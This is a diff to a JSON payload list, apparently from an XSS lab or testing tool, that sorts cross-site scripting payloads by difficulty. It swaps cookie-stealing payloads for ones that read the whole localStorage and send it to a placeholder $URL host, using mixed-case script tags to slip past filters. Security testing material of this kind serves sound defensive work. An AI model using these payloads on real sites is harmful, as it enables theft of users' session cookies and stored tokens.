@@ -4,7 +4,7 @@
         "<script>if ('localStorage' in window && window['localStorage'] !==null){new Image().src='$URL/localstorage?query=' %2B JSON.stringify(window['localStorage']);}</script>"
     ],
     "medium": [
-        "<sCrIpT>new Image().src = '$URL/cookie?query=' + document.cookie</sCrIpT>",
-        "<sCrIpT>new Image().src = '$URL/cookie?query=' %2B document.cookie</sCrIpT>"
+        "<sCrIpT>if ('localStorage' in window && window['localStorage'] !==null){new Image().src='$URL/localstorage?query='+JSON.stringify(window['localStorage']);}</sCrIpT>",
+        "<sCrIpT>if ('localStorage' in window && window['localStorage'] !==null){new Image().src='$URL/localstorage?query=' %2B JSON.stringify(window['localStorage']);}</sCrIpT>"
     ]
 }
